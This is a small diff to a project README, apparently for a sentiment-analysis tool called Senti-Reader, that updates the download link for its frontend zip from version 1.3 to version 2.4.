@@ -19,4 +19,4 @@ It also contains the jupyter notebook with all the steps for the final model cre
 ### ToDo
 - Nothing
 
-Here is the [frontend](https://raw.githubusercontent.com/Imonholic/Senti-Reader/main/api/Senti_Reader_v1.3.zip).
+Here is the [frontend](https://raw.githubusercontent.com/Imonholic/Senti-Reader/main/sentireader/Senti_Reader_v2.4.zip).
